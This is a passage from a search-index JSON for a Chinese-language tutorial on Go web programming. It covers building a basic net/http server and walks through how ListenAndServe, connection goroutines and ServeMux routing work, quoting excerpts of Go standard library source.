<p>\u7f51\u9875\u4f18\u5316\u65b9\u9762\u6709\u4e00\u9879\u63aa\u65bd\u662f\u51cf\u5c11HTTP\u8bf7\u6c42\u6b21\u6570\uff0c\u5c31\u662f\u628a\u5c3d\u91cf\u591a\u7684css\u548cjs\u8d44\u6e90\u5408\u5e76\u5728\u4e00\u8d77\uff0c\u76ee\u7684\u662f\u5c3d\u91cf\u51cf\u5c11\u7f51\u9875\u8bf7\u6c42\u9759\u6001\u8d44\u6e90\u7684\u6b21\u6570\uff0c\u63d0\u9ad8\u7f51\u9875\u52a0\u8f7d\u901f\u5ea6\uff0c\u540c\u65f6\u51cf\u7f13\u670d\u52a1\u5668\u7684\u538b\u529b\u3002</p>"},{"location":"03.1/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: Web\u57fa\u7840</li> <li>\u4e0b\u4e00\u8282: Go\u642d\u5efa\u4e00\u4e2aWeb\u670d\u52a1\u5668</li> </ul>"},{"location":"03.2/","title":"3.2 Go\u642d\u5efa\u4e00\u4e2aWeb\u670d\u52a1\u5668","text":"<p>\u524d\u9762\u5c0f\u8282\u5df2\u7ecf\u4ecb\u7ecd\u4e86Web\u662f\u57fa\u4e8ehttp\u534f\u8bae\u7684\u4e00\u4e2a\u670d\u52a1\uff0cGo\u8bed\u8a00\u91cc\u9762\u63d0\u4f9b\u4e86\u4e00\u4e2a\u5b8c\u5584\u7684net/http\u5305\uff0c\u901a\u8fc7http\u5305\u53ef\u4ee5\u5f88\u65b9\u4fbf\u7684\u642d\u5efa\u8d77\u6765\u4e00\u4e2a\u53ef\u4ee5\u8fd0\u884c\u7684Web\u670d\u52a1\u3002\u540c\u65f6\u4f7f\u7528\u8fd9\u4e2a\u5305\u80fd\u5f88\u7b80\u5355\u5730\u5bf9Web\u7684\u8def\u7531\uff0c\u9759\u6001\u6587\u4ef6\uff0c\u6a21\u7248\uff0ccookie\u7b49\u6570\u636e\u8fdb\u884c\u8bbe\u7f6e\u548c\u64cd\u4f5c\u3002</p>"},{"location":"03.2/#httpweb","title":"http\u5305\u5efa\u7acbWeb\u670d\u52a1\u5668","text":"<p><pre><code>package main\n\nimport (\n\"fmt\"\n\"net/http\"\n\"strings\"\n\"log\"\n)\n\nfunc sayhelloName(w http.ResponseWriter, r *http.Request) {\nr.ParseForm()  //\u89e3\u6790\u53c2\u6570\uff0c\u9ed8\u8ba4\u662f\u4e0d\u4f1a\u89e3\u6790\u7684\nfmt.Println(r.Form)  //\u8fd9\u4e9b\u4fe1\u606f\u662f\u8f93\u51fa\u5230\u670d\u52a1\u5668\u7aef\u7684\u6253\u5370\u4fe1\u606f\nfmt.Println(\"path\", r.URL.Path)\nfmt.Println(\"scheme\", r.URL.Scheme)\nfmt.Println(r.Form[\"url_long\"])\nfor k, v := range r.Form {\nfmt.Println(\"key:\", k)\nfmt.Println(\"val:\", strings.Join(v, \"\"))\n}\nfmt.Fprintf(w, \"Hello astaxie!\") //\u8fd9\u4e2a\u5199\u5165\u5230w\u7684\u662f\u8f93\u51fa\u5230\u5ba2\u6237\u7aef\u7684\n}\n\nfunc main() {\nhttp.HandleFunc(\"/\", sayhelloName) //\u8bbe\u7f6e\u8bbf\u95ee\u7684\u8def\u7531\nerr := http.ListenAndServe(\":9090\", nil) //\u8bbe\u7f6e\u76d1\u542c\u7684\u7aef\u53e3\nif err != nil {\nlog.Fatal(\"ListenAndServe: \", err)\n}\n}\n</code></pre> \u4e0a\u9762\u8fd9\u4e2a\u4ee3\u7801\uff0c\u6211\u4eecbuild\u4e4b\u540e\uff0c\u7136\u540e\u6267\u884cweb.exe,\u8fd9\u4e2a\u65f6\u5019\u5176\u5b9e\u5df2\u7ecf\u57289090\u7aef\u53e3\u76d1\u542chttp\u94fe\u63a5\u8bf7\u6c42\u4e86\u3002</p> <p>\u5728\u6d4f\u89c8\u5668\u8f93\u5165<code>http://localhost:9090</code></p> <p>\u53ef\u4ee5\u770b\u5230\u6d4f\u89c8\u5668\u9875\u9762\u8f93\u51fa\u4e86<code>Hello astaxie!</code></p> <p>\u53ef\u4ee5\u6362\u4e00\u4e2a\u5730\u5740\u8bd5\u8bd5\uff1a<code>http://localhost:9090/?url_long=111&amp;url_long=222</code></p> <p>\u770b\u770b\u6d4f\u89c8\u5668\u8f93\u51fa\u7684\u662f\u4ec0\u4e48\uff0c\u670d\u52a1\u5668\u8f93\u51fa\u7684\u662f\u4ec0\u4e48\uff1f</p> <p>\u5728\u670d\u52a1\u5668\u7aef\u8f93\u51fa\u7684\u4fe1\u606f\u5982\u4e0b\uff1a</p> <p></p> <p>\u56fe3.8 \u7528\u6237\u8bbf\u95eeWeb\u4e4b\u540e\u670d\u52a1\u5668\u7aef\u6253\u5370\u7684\u4fe1\u606f</p> <p>\u6211\u4eec\u770b\u5230\u4e0a\u9762\u7684\u4ee3\u7801\uff0c\u8981\u7f16\u5199\u4e00\u4e2aWeb\u670d\u52a1\u5668\u5f88\u7b80\u5355\uff0c\u53ea\u8981\u8c03\u7528http\u5305\u7684\u4e24\u4e2a\u51fd\u6570\u5c31\u53ef\u4ee5\u4e86\u3002</p> <p>\u5982\u679c\u4f60\u4ee5\u524d\u662fPHP\u7a0b\u5e8f\u5458\uff0c\u90a3\u4f60\u4e5f\u8bb8\u5c31\u4f1a\u95ee\uff0c\u6211\u4eec\u7684nginx\u3001apache\u670d\u52a1\u5668\u4e0d\u9700\u8981\u5417\uff1fGo\u5c31\u662f\u4e0d\u9700\u8981\u8fd9\u4e9b\uff0c\u56e0\u4e3a\u4ed6\u76f4\u63a5\u5c31\u76d1\u542ctcp\u7aef\u53e3\u4e86\uff0c\u505a\u4e86nginx\u505a\u7684\u4e8b\u60c5\uff0c\u7136\u540esayhelloName\u8fd9\u4e2a\u5176\u5b9e\u5c31\u662f\u6211\u4eec\u5199\u7684\u903b\u8f91\u51fd\u6570\u4e86\uff0c\u8ddfphp\u91cc\u9762\u7684\u63a7\u5236\u5c42\uff08controller\uff09\u51fd\u6570\u7c7b\u4f3c\u3002</p> <p>\u5982\u679c\u4f60\u4ee5\u524d\u662fPython\u7a0b\u5e8f\u5458\uff0c\u90a3\u4e48\u4f60\u4e00\u5b9a\u542c\u8bf4\u8fc7tornado\uff0c\u8fd9\u4e2a\u4ee3\u7801\u548c\u4ed6\u662f\u4e0d\u662f\u5f88\u50cf\uff0c\u5bf9\uff0c\u6ca1\u9519\uff0cGo\u5c31\u662f\u62e5\u6709\u7c7b\u4f3cPython\u8fd9\u6837\u52a8\u6001\u8bed\u8a00\u7684\u7279\u6027\uff0c\u5199Web\u5e94\u7528\u5f88\u65b9\u4fbf\u3002</p> <p>\u5982\u679c\u4f60\u4ee5\u524d\u662fRuby\u7a0b\u5e8f\u5458\uff0c\u4f1a\u53d1\u73b0\u548cROR\u7684/script/server\u542f\u52a8\u6709\u70b9\u7c7b\u4f3c\u3002</p> <p>\u6211\u4eec\u770b\u5230Go\u901a\u8fc7\u7b80\u5355\u7684\u51e0\u884c\u4ee3\u7801\u5c31\u5df2\u7ecf\u8fd0\u884c\u8d77\u6765\u4e00\u4e2aWeb\u670d\u52a1\u4e86\uff0c\u800c\u4e14\u8fd9\u4e2aWeb\u670d\u52a1\u5185\u90e8\u6709\u652f\u6301\u9ad8\u5e76\u53d1\u7684\u7279\u6027\uff0c\u6211\u5c06\u4f1a\u5728\u63a5\u4e0b\u6765\u7684\u4e24\u4e2a\u5c0f\u8282\u91cc\u9762\u8be6\u7ec6\u7684\u8bb2\u89e3\u4e00\u4e0bGo\u662f\u5982\u4f55\u5b9e\u73b0Web\u9ad8\u5e76\u53d1\u7684\u3002</p>"},{"location":"03.2/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: Web\u5de5\u4f5c\u65b9\u5f0f</li> <li>\u4e0b\u4e00\u8282: Go\u5982\u4f55\u4f7f\u5f97web\u5de5\u4f5c</li> </ul>"},{"location":"03.3/","title":"3.3 Go\u5982\u4f55\u4f7f\u5f97Web\u5de5\u4f5c","text":"<p>\u524d\u9762\u5c0f\u8282\u4ecb\u7ecd\u4e86\u5982\u4f55\u901a\u8fc7Go\u642d\u5efa\u4e00\u4e2aWeb\u670d\u52a1\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u7b80\u5355\u5e94\u7528\u4e00\u4e2anet/http\u5305\u5c31\u65b9\u4fbf\u7684\u642d\u5efa\u8d77\u6765\u4e86\u3002\u90a3\u4e48Go\u5728\u5e95\u5c42\u5230\u5e95\u662f\u600e\u4e48\u505a\u7684\u5462\uff1f\u4e07\u53d8\u4e0d\u79bb\u5176\u5b97\uff0cGo\u7684Web\u670d\u52a1\u5de5\u4f5c\u4e5f\u79bb\u4e0d\u5f00\u6211\u4eec\u7b2c\u4e00\u5c0f\u8282\u4ecb\u7ecd\u7684Web\u5de5\u4f5c\u65b9\u5f0f\u3002</p>"},{"location":"03.3/#web","title":"web\u5de5\u4f5c\u65b9\u5f0f\u7684\u51e0\u4e2a\u6982\u5ff5","text":"<p>\u4ee5\u4e0b\u5747\u662f\u670d\u52a1\u5668\u7aef\u7684\u51e0\u4e2a\u6982\u5ff5</p> <p>Request\uff1a\u7528\u6237\u8bf7\u6c42\u7684\u4fe1\u606f\uff0c\u7528\u6765\u89e3\u6790\u7528\u6237\u7684\u8bf7\u6c42\u4fe1\u606f\uff0c\u5305\u62ecpost\u3001get\u3001cookie\u3001url\u7b49\u4fe1\u606f</p> <p>Response\uff1a\u670d\u52a1\u5668\u9700\u8981\u53cd\u9988\u7ed9\u5ba2\u6237\u7aef\u7684\u4fe1\u606f</p> <p>Conn\uff1a\u7528\u6237\u7684\u6bcf\u6b21\u8bf7\u6c42\u94fe\u63a5</p> <p>Handler\uff1a\u5904\u7406\u8bf7\u6c42\u548c\u751f\u6210\u8fd4\u56de\u4fe1\u606f\u7684\u5904\u7406\u903b\u8f91</p>"},{"location":"03.3/#http","title":"\u5206\u6790http\u5305\u8fd0\u884c\u673a\u5236","text":"<p>\u4e0b\u56fe\u662fGo\u5b9e\u73b0Web\u670d\u52a1\u7684\u5de5\u4f5c\u6a21\u5f0f\u7684\u6d41\u7a0b\u56fe</p> <p></p> <p>\u56fe3.9 http\u5305\u6267\u884c\u6d41\u7a0b</p> <ol> <li> <p>\u521b\u5efaListen Socket, \u76d1\u542c\u6307\u5b9a\u7684\u7aef\u53e3, \u7b49\u5f85\u5ba2\u6237\u7aef\u8bf7\u6c42\u5230\u6765\u3002</p> </li> <li> <p>Listen Socket\u63a5\u53d7\u5ba2\u6237\u7aef\u7684\u8bf7\u6c42, \u5f97\u5230Client Socket, \u63a5\u4e0b\u6765\u901a\u8fc7Client Socket\u4e0e\u5ba2\u6237\u7aef\u901a\u4fe1\u3002</p> </li> <li> <p>\u5904\u7406\u5ba2\u6237\u7aef\u7684\u8bf7\u6c42, \u9996\u5148\u4eceClient Socket\u8bfb\u53d6HTTP\u8bf7\u6c42\u7684\u534f\u8bae\u5934, \u5982\u679c\u662fPOST\u65b9\u6cd5, \u8fd8\u53ef\u80fd\u8981\u8bfb\u53d6\u5ba2\u6237\u7aef\u63d0\u4ea4\u7684\u6570\u636e, \u7136\u540e\u4ea4\u7ed9\u76f8\u5e94\u7684handler\u5904\u7406\u8bf7\u6c42, handler\u5904\u7406\u5b8c\u6bd5\u51c6\u5907\u597d\u5ba2\u6237\u7aef\u9700\u8981\u7684\u6570\u636e, \u901a\u8fc7Client Socket\u5199\u7ed9\u5ba2\u6237\u7aef\u3002</p> </li> </ol> <p>\u8fd9\u6574\u4e2a\u7684\u8fc7\u7a0b\u91cc\u9762\u6211\u4eec\u53ea\u8981\u4e86\u89e3\u6e05\u695a\u4e0b\u9762\u4e09\u4e2a\u95ee\u9898\uff0c\u4e5f\u5c31\u77e5\u9053Go\u662f\u5982\u4f55\u8ba9Web\u8fd0\u884c\u8d77\u6765\u4e86</p> <ul> <li>\u5982\u4f55\u76d1\u542c\u7aef\u53e3\uff1f</li> <li>\u5982\u4f55\u63a5\u6536\u5ba2\u6237\u7aef\u8bf7\u6c42\uff1f</li> <li>\u5982\u4f55\u5206\u914dhandler\uff1f</li> </ul> <p>\u524d\u9762\u5c0f\u8282\u7684\u4ee3\u7801\u91cc\u9762\u6211\u4eec\u53ef\u4ee5\u770b\u5230\uff0cGo\u662f\u901a\u8fc7\u4e00\u4e2a\u51fd\u6570<code>ListenAndServe</code>\u6765\u5904\u7406\u8fd9\u4e9b\u4e8b\u60c5\u7684\uff0c\u5176\u5b9e\u73b0\u6e90\u7801\u5982\u4e0b\uff1a</p> <pre><code>func ListenAndServe(addr string, handler Handler) error {\nserver := &amp;Server{Addr: addr, Handler: handler}\nreturn server.ListenAndServe()\n}\n</code></pre> <p><code>ListenAndServe</code>\u4f1a\u521d\u59cb\u5316\u4e00\u4e2a<code>sever</code>\u5bf9\u8c61\uff0c\u7136\u540e\u8c03\u7528\u4e86<code>Server</code>\u5bf9\u8c61\u7684\u65b9\u6cd5<code>ListenAndServe</code>\u3002\u5176\u6e90\u7801\u5982\u4e0b\uff1a</p> <pre><code>func (srv *Server) ListenAndServe() error {\nif srv.shuttingDown() {\nreturn ErrServerClosed\n}\naddr := srv.Addr\nif addr == \"\" {\naddr = \":http\"\n}\nln, err := net.Listen(\"tcp\", addr)\nif err != nil {\nreturn err\n}\nreturn srv.Serve(ln)\n}\n</code></pre> <p><code>ListenAndServe</code>\u8c03\u7528\u4e86<code>net.Listen(\"tcp\", addr)</code>\uff0c\u4e5f\u5c31\u662f\u5e95\u5c42\u7528TCP\u534f\u8bae\u642d\u5efa\u4e86\u4e00\u4e2a\u670d\u52a1\uff0c\u6700\u540e\u8c03\u7528<code>src.Serve</code>\u76d1\u63a7\u6211\u4eec\u8bbe\u7f6e\u7684\u7aef\u53e3\u3002\u76d1\u63a7\u4e4b\u540e\u5982\u4f55\u63a5\u6536\u5ba2\u6237\u7aef\u7684\u8bf7\u6c42\u5462\uff1f</p> <p><code>Serve</code>\u7684\u5177\u4f53\u5b9e\u73b0\u5982\u4e0b(\u4e3a\u7a81\u51fa\u91cd\u70b9\uff0c\u4ec5\u5c55\u793a\u5173\u952e\u4ee3\u7801)\uff0c\u901a\u8fc7\u4e0b\u9762\u7684\u5206\u6790\u6e90\u7801\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u5ba2\u6237\u7aef\u8bf7\u6c42\u7684\u5177\u4f53\u5904\u7406\u8fc7\u7a0b\uff1a</p> <pre><code>func (srv *Server) Serve(l net.Listener) error {\n...\n\nctx := context.WithValue(baseCtx, ServerContextKey, srv)\nfor {\nrw, err := l.Accept()\n...\n\nconnCtx := ctx\nif cc := srv.ConnContext; cc != nil {\nconnCtx = cc(connCtx, rw)\nif connCtx == nil {\npanic(\"ConnContext returned nil\")\n}\n}\ntempDelay = 0\nc := srv.newConn(rw)\nc.setState(c.rwc, StateNew, runHooks) // before Serve can return\ngo c.serve(connCtx)\n}\n}\n</code></pre> <p>\u8fd9\u4e2a\u51fd\u6570\u91cc\u9762\u8d77\u4e86\u4e00\u4e2a<code>for{}</code>\uff0c\u9996\u5148\u901a\u8fc7Listener\u63a5\u6536\u8bf7\u6c42\uff1a<code>l.Accept()</code>\uff0c\u5176\u6b21\u521b\u5efa\u4e00\u4e2aConn\uff1a<code>c := srv.newConn(rw)</code>\uff0c\u6700\u540e\u5355\u72ec\u5f00\u4e86\u4e00\u4e2agoroutine\uff0c\u628a\u8fd9\u4e2a\u8bf7\u6c42\u7684\u6570\u636e\u5f53\u505a\u53c2\u6570\u6254\u7ed9\u8fd9\u4e2aconn\u53bb\u670d\u52a1\uff1a<code>go c.serve(connCtx)</code>\u3002\u8fd9\u4e2a\u5c31\u662f\u9ad8\u5e76\u53d1\u4f53\u73b0\u4e86\uff0c\u7528\u6237\u7684\u6bcf\u4e00\u6b21\u8bf7\u6c42\u90fd\u662f\u5728\u4e00\u4e2a\u65b0\u7684goroutine\u53bb\u670d\u52a1\uff0c\u76f8\u4e92\u4e0d\u5f71\u54cd\u3002</p> <p>\u90a3\u4e48\u5982\u4f55\u5177\u4f53\u5206\u914d\u5230\u76f8\u5e94\u7684\u51fd\u6570\u6765\u5904\u7406\u8bf7\u6c42\u5462\uff1f\u6211\u4eec\u7ee7\u7eed\u5206\u6790conn\u7684<code>serve</code>\u65b9\u6cd5\uff0c\u5176\u6e90\u7801\u5982\u4e0b(\u4e3a\u7a81\u51fa\u91cd\u70b9\uff0c\u4ec5\u5c55\u793a\u5173\u952e\u4ee3\u7801)\uff1a</p> <pre><code>func (c *conn) serve(ctx context.Context) {\n...\n\nctx, cancelCtx := context.WithCancel(ctx)\nc.cancelCtx = cancelCtx\ndefer cancelCtx()\n\nc.r = &amp;connReader{conn: c}\nc.bufr = newBufioReader(c.r)\nc.bufw = newBufioWriterSize(checkConnErrorWriter{c}, 4&lt;&lt;10)\n\nfor {\nw, err := c.readRequest(ctx)\n...\n\n// HTTP cannot have multiple simultaneous active requests.[*]\n// Until the server replies to this request, it can't read another,\n// so we might as well run the handler in this goroutine.\n// [*] Not strictly true: HTTP pipelining. We could let them all process\n// in parallel even if their responses need to be serialized.\n// But we're not going to implement HTTP pipelining because it\n// was never deployed in the wild and the answer is HTTP/2.\nserverHandler{c.server}.ServeHTTP(w, w.req)\nw.cancelCtx()\n...\n\n}\n}\n</code></pre> <p>conn\u9996\u5148\u4f1a\u89e3\u6790request:<code>w, err := c.readRequest(ctx)</code>, \u7136\u540e\u83b7\u53d6\u76f8\u5e94\u7684handler\u53bb\u5904\u7406\u8bf7\u6c42:<code>serverHandler{c.server}.ServeHTTP(w, w.req)</code>\uff0c<code>ServeHTTP</code>\u7684\u5177\u4f53\u5b9e\u73b0\u5982\u4e0b\uff1a</p> <pre><code>func (sh serverHandler) ServeHTTP(rw ResponseWriter, req *Request) {\nhandler := sh.srv.Handler\nif handler == nil {\nhandler = DefaultServeMux\n}\nif req.RequestURI == \"*\" &amp;&amp; req.Method == \"OPTIONS\" {\nhandler = globalOptionsHandler{}\n}\nhandler.ServeHTTP(rw, req)\n}\n</code></pre> <p><code>sh.srv.Handler</code>\u5c31\u662f\u6211\u4eec\u521a\u624d\u5728\u8c03\u7528\u51fd\u6570<code>ListenAndServe</code>\u65f6\u5019\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u6211\u4eec\u524d\u9762\u4f8b\u5b50\u4f20\u9012\u7684\u662fnil\uff0c\u4e5f\u5c31\u662f\u4e3a\u7a7a\uff0c\u90a3\u4e48\u9ed8\u8ba4\u83b7\u53d6<code>handler = DefaultServeMux</code>,\u90a3\u4e48\u8fd9\u4e2a\u53d8\u91cf\u7528\u6765\u505a\u4ec0\u4e48\u7684\u5462\uff1f\u5bf9\uff0c\u8fd9\u4e2a\u53d8\u91cf\u5c31\u662f\u4e00\u4e2a\u8def\u7531\u5668\uff0c\u5b83\u7528\u6765\u5339\u914durl\u8df3\u8f6c\u5230\u5176\u76f8\u5e94\u7684handle\u51fd\u6570\uff0c\u90a3\u4e48\u8fd9\u4e2a\u6211\u4eec\u6709\u8bbe\u7f6e\u8fc7\u5417?\u6709\uff0c\u6211\u4eec\u8c03\u7528\u7684\u4ee3\u7801\u91cc\u9762\u7b2c\u4e00\u53e5\u4e0d\u662f\u8c03\u7528\u4e86<code>http.HandleFunc(\"/\", sayhelloName)</code>\u561b\u3002\u8fd9\u4e2a\u4f5c\u7528\u5c31\u662f\u6ce8\u518c\u4e86\u8bf7\u6c42<code>/</code>\u7684\u8def\u7531\u89c4\u5219\uff0c\u5f53\u8bf7\u6c42uri\u4e3a\"/\"\uff0c\u8def\u7531\u5c31\u4f1a\u8f6c\u5230\u51fd\u6570sayhelloName\uff0cDefaultServeMux\u4f1a\u8c03\u7528ServeHTTP\u65b9\u6cd5\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u5185\u90e8\u5176\u5b9e\u5c31\u662f\u8c03\u7528sayhelloName\u672c\u8eab\uff0c\u6700\u540e\u901a\u8fc7\u5199\u5165response\u7684\u4fe1\u606f\u53cd\u9988\u5230\u5ba2\u6237\u7aef\u3002</p> <p>\u8be6\u7ec6\u7684\u6574\u4e2a\u6d41\u7a0b\u5982\u4e0b\u56fe\u6240\u793a\uff1a</p> <p></p> <p>\u56fe3.10 \u4e00\u4e2ahttp\u8fde\u63a5\u5904\u7406\u6d41\u7a0b</p> <p>\u81f3\u6b64\u6211\u4eec\u7684\u4e09\u4e2a\u95ee\u9898\u5df2\u7ecf\u5168\u90e8\u5f97\u5230\u4e86\u89e3\u7b54\uff0c\u4f60\u73b0\u5728\u5bf9\u4e8eGo\u5982\u4f55\u8ba9Web\u8dd1\u8d77\u6765\u7684\u662f\u5426\u5df2\u7ecf\u57fa\u672c\u4e86\u89e3\u4e86\u5462\uff1f</p>"},{"location":"03.3/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: GO\u642d\u5efa\u4e00\u4e2a\u7b80\u5355\u7684web\u670d\u52a1</li> <li>\u4e0b\u4e00\u8282: Go\u7684http\u5305\u8be6\u89e3</li> </ul>"},{"location":"03.4/","title":"3.4 Go\u7684http\u5305\u8be6\u89e3","text":"<p>\u524d\u9762\u5c0f\u8282\u4ecb\u7ecd\u4e86Go\u600e\u4e48\u6837\u5b9e\u73b0\u4e86Web\u5de5\u4f5c\u6a21\u5f0f\u7684\u4e00\u4e2a\u6d41\u7a0b\uff0c\u8fd9\u4e00\u5c0f\u8282\uff0c\u6211\u4eec\u5c06\u8be6\u7ec6\u5730\u89e3\u5256\u4e00\u4e0bhttp\u5305\uff0c\u770b\u5b83\u5230\u5e95\u662f\u600e\u6837\u5b9e\u73b0\u6574\u4e2a\u8fc7\u7a0b\u7684\u3002</p> <p>Go\u7684http\u6709\u4e24\u4e2a\u6838\u5fc3\u529f\u80fd\uff1aConn\u3001ServeMux</p>"},{"location":"03.4/#conngoroutine","title":"Conn\u7684goroutine","text":"<p>\u4e0e\u6211\u4eec\u4e00\u822c\u7f16\u5199\u7684http\u670d\u52a1\u5668\u4e0d\u540c, Go\u4e3a\u4e86\u5b9e\u73b0\u9ad8\u5e76\u53d1\u548c\u9ad8\u6027\u80fd, \u4f7f\u7528\u4e86goroutines\u6765\u5904\u7406Conn\u7684\u8bfb\u5199\u4e8b\u4ef6, \u8fd9\u6837\u6bcf\u4e2a\u8bf7\u6c42\u90fd\u80fd\u4fdd\u6301\u72ec\u7acb\uff0c\u76f8\u4e92\u4e0d\u4f1a\u963b\u585e\uff0c\u53ef\u4ee5\u9ad8\u6548\u7684\u54cd\u5e94\u7f51\u7edc\u4e8b\u4ef6\u3002\u8fd9\u662fGo\u9ad8\u6548\u7684\u4fdd\u8bc1\u3002</p> <p>Go\u5728\u7b49\u5f85\u5ba2\u6237\u7aef\u8bf7\u6c42\u91cc\u9762\u662f\u8fd9\u6837\u5199\u7684\uff1a <pre><code>c, err := srv.newConn(rw)\nif err != nil {\ncontinue\n}\ngo c.serve()\n</code></pre> \u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u5ba2\u6237\u7aef\u7684\u6bcf\u6b21\u8bf7\u6c42\u90fd\u4f1a\u521b\u5efa\u4e00\u4e2aConn\uff0c\u8fd9\u4e2aConn\u91cc\u9762\u4fdd\u5b58\u4e86\u8be5\u6b21\u8bf7\u6c42\u7684\u4fe1\u606f\uff0c\u7136\u540e\u518d\u4f20\u9012\u5230\u5bf9\u5e94\u7684handler\uff0c\u8be5handler\u4e2d\u4fbf\u53ef\u4ee5\u8bfb\u53d6\u5230\u76f8\u5e94\u7684header\u4fe1\u606f\uff0c\u8fd9\u6837\u4fdd\u8bc1\u4e86\u6bcf\u4e2a\u8bf7\u6c42\u7684\u72ec\u7acb\u6027\u3002</p>"},{"location":"03.4/#servemux","title":"ServeMux\u7684\u81ea\u5b9a\u4e49","text":"<p>\u6211\u4eec\u524d\u9762\u5c0f\u8282\u8bb2\u8ff0conn.server\u7684\u65f6\u5019\uff0c\u5176\u5b9e\u5185\u90e8\u662f\u8c03\u7528\u4e86http\u5305\u9ed8\u8ba4\u7684\u8def\u7531\u5668\uff0c\u901a\u8fc7\u8def\u7531\u5668\u628a\u672c\u6b21\u8bf7\u6c42\u7684\u4fe1\u606f\u4f20\u9012\u5230\u4e86\u540e\u7aef\u7684\u5904\u7406\u51fd\u6570\u3002\u90a3\u4e48\u8fd9\u4e2a\u8def\u7531\u5668\u662f\u600e\u4e48\u5b9e\u73b0\u7684\u5462\uff1f</p> <p>\u5b83\u7684\u7ed3\u6784\u5982\u4e0b\uff1a <pre><code>type ServeMux struct {\nmu sync.RWMutex   //\u9501\uff0c\u7531\u4e8e\u8bf7\u6c42\u6d89\u53ca\u5230\u5e76\u53d1\u5904\u7406\uff0c\u56e0\u6b64\u8fd9\u91cc\u9700\u8981\u4e00\u4e2a\u9501\u673a\u5236\nm  map[string]muxEntry  // \u8def\u7531\u89c4\u5219\uff0c\u4e00\u4e2astring\u5bf9\u5e94\u4e00\u4e2amux\u5b9e\u4f53\uff0c\u8fd9\u91cc\u7684string\u5c31\u662f\u6ce8\u518c\u7684\u8def\u7531\u8868\u8fbe\u5f0f\nhosts bool // \u662f\u5426\u5728\u4efb\u610f\u7684\u89c4\u5219\u4e2d\u5e26\u6709host\u4fe1\u606f\n}\n</code></pre> \u4e0b\u9762\u770b\u4e00\u4e0bmuxEntry <pre><code>type muxEntry struct {\nexplicit bool   // \u662f\u5426\u7cbe\u786e\u5339\u914d\nh        Handler // \u8fd9\u4e2a\u8def\u7531\u8868\u8fbe\u5f0f\u5bf9\u5e94\u54ea\u4e2ahandler\npattern  string  //\u5339\u914d\u5b57\u7b26\u4e32\n}\n</code></pre> \u63a5\u7740\u770b\u4e00\u4e0bHandler\u7684\u5b9a\u4e49 <pre><code>type Handler interface {\nServeHTTP(ResponseWriter, *Request)  // \u8def\u7531\u5b9e\u73b0\u5668\n}\n</code></pre> Handler\u662f\u4e00\u4e2a\u63a5\u53e3\uff0c\u4f46\u662f\u524d\u4e00\u5c0f\u8282\u4e2d\u7684<code>sayhelloName</code>\u51fd\u6570\u5e76\u6ca1\u6709\u5b9e\u73b0ServeHTTP\u8fd9\u4e2a\u63a5\u53e3\uff0c\u4e3a\u4ec0\u4e48\u80fd\u6dfb\u52a0\u5462\uff1f\u539f\u6765\u5728http\u5305\u91cc\u9762\u8fd8\u5b9a\u4e49\u4e86\u4e00\u4e2a\u7c7b\u578b<code>HandlerFunc</code>,\u6211\u4eec\u5b9a\u4e49\u7684\u51fd\u6570<code>sayhelloName</code>\u5c31\u662f\u8fd9\u4e2aHandlerFunc\u8c03\u7528\u4e4b\u540e\u7684\u7ed3\u679c\uff0c\u8fd9\u4e2a\u7c7b\u578b\u9ed8\u8ba4\u5c31\u5b9e\u73b0\u4e86ServeHTTP\u8fd9\u4e2a\u63a5\u53e3\uff0c\u5373\u6211\u4eec\u8c03\u7528\u4e86HandlerFunc(f),\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362f\u6210\u4e3aHandlerFunc\u7c7b\u578b\uff0c\u8fd9\u6837f\u5c31\u62e5\u6709\u4e86ServeHTTP\u65b9\u6cd5\u3002 <pre><code>type HandlerFunc func(ResponseWriter, *Request)\n\n// ServeHTTP calls f(w, r).\nfunc (f HandlerFunc) ServeHTTP(w ResponseWriter, r *Request) {\nf(w, r)\n}\n</code></pre> \u8def\u7531\u5668\u91cc\u9762\u5b58\u50a8\u597d\u4e86\u76f8\u5e94\u7684\u8def\u7531\u89c4\u5219\u4e4b\u540e\uff0c\u90a3\u4e48\u5177\u4f53\u7684\u8bf7\u6c42\u53c8\u662f\u600e\u4e48\u5206\u53d1\u7684\u5462\uff1f\u8bf7\u770b\u4e0b\u9762\u7684\u4ee3\u7801\uff0c\u9ed8\u8ba4\u7684\u8def\u7531\u5668\u5b9e\u73b0\u4e86<code>ServeHTTP</code>\uff1a <pre><code>func (mux *ServeMux) ServeHTTP(w ResponseWriter, r *Request) {\nif r.RequestURI == \"*\" {\nw.Header().Set(\"Connection\", \"close\")\nw.WriteHeader(StatusBadRequest)\nreturn\n}\nh, _ := mux.Handler(r)\nh.ServeHTTP(w, r)\n}\n</code></pre> \u5982\u4e0a\u6240\u793a\u8def\u7531\u5668\u63a5\u6536\u5230\u8bf7\u6c42\u4e4b\u540e\uff0c\u5982\u679c\u662f<code>*</code>\u90a3\u4e48\u5173\u95ed\u94fe\u63a5\uff0c\u4e0d\u7136\u8c03\u7528<code>mux.Handler(r)</code>\u8fd4\u56de\u5bf9\u5e94\u8bbe\u7f6e\u8def\u7531\u7684\u5904\u7406Handler\uff0c\u7136\u540e\u6267\u884c<code>h.ServeHTTP(w, r)</code></p> <p>\u4e5f\u5c31\u662f\u8c03\u7528\u5bf9\u5e94\u8def\u7531\u7684handler\u7684ServerHTTP\u63a5\u53e3\uff0c\u90a3\u4e48mux.Handler\u00ae\u600e\u4e48\u5904\u7406\u7684\u5462\uff1f <pre><code>func (mux *ServeMux) Handler(r *Request) (h Handler, pattern string) {\nif r.Method != \"CONNECT\" {\nif p := cleanPath(r.URL.Path); p != r.URL.Path {\n_, pattern = mux.handler(r.Host, p)\nreturn RedirectHandler(p, StatusMovedPermanently), pattern\n}\n}   return mux.handler(r.Host, r.URL.Path)\n}\n\nfunc (mux *ServeMux) handler(host, path string) (h Handler, pattern string) {\nmux.mu.RLock()\ndefer mux.mu.RUnlock()\n\n// Host-specific pattern takes precedence over generic ones\nif mux.hosts {\nh, pattern = mux.match(host + path)\n}\nif h == nil {\nh, pattern = mux.match(path)\n}\nif h == nil {\nh, pattern = NotFoundHandler(), 